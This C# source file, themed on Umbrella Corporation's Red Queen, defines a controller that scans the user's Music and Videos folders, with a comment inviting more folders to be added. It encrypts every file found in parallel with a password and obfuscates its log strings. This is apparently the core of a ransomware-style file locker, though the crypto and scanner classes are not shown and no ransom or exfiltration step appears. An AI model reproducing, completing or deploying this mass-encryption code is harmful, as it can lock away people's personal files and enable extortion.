using System;
using System.Linq;
using System.Security;
using System.Threading.Tasks;

namespace SPIDERS_UMBRELLA_CORPORATION.Core
{
    public class RedQueenController
    {
        private readonly UmbrellaCrypto _crypto;
        private readonly HiveScanner _scanner;
        private readonly Action<string, bool> _logger;
        private readonly Action _onSubjectProcessed;
        private readonly Action _onCpuActivity;

        public RedQueenController(Action<string, bool> logger, Action onSubjectProcessed, Action onCpuActivity)
        {
            _crypto = new UmbrellaCrypto();
            _scanner = new HiveScanner();
            _logger = logger;
            _onSubjectProcessed = onSubjectProcessed;
            _onCpuActivity = onCpuActivity;
        }

        public async Task ExecuteProtocolAsync(SecureString password, bool encryptMode)
        {
            try
            {
                                // Obfuscated Logging Strings
                _logger(SecurityUtils.BioText("INITIALIZING HIVE SCAN..."), false);

                var targets = await Task.Run(() =>
                    _scanner.Scan(new[] {
                                 // MORE SPECIAL FOLDER PATHS CAN BE ADDED HERE...
                        Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                        Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)
                    }).ToList()
                );

                _logger(SecurityUtils.BioText($"SUBJECTS IDENTIFIED: {targets.Count}"), false);

                await Task.Run(() =>
                {
                    Parallel.ForEach(targets, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount }, (file) =>
                    {
                        try
                        {
                            _onCpuActivity?.Invoke();
                            if (encryptMode) _crypto.EncryptFile(file, password);
                            else _crypto.DecryptFile(file, password);

                            _onSubjectProcessed?.Invoke();
                            _logger(SecurityUtils.BioText($"PROCESSED: {System.IO.Path.GetFileName(file)}"), false);
                        }
                        catch (Exception ex)
                        {
                            _logger(SecurityUtils.BioText($"ERROR: {ex.Message}"), true);
                        }
                    });
                });
                _logger(SecurityUtils.BioText("PROTOCOL COMPLETE. SYSTEM STANDBY."), false);
            }
            catch (Exception ex) { _logger(SecurityUtils.BioText($"CRITICAL FAILURE: {ex.Message}"), true); }
        }
    }
}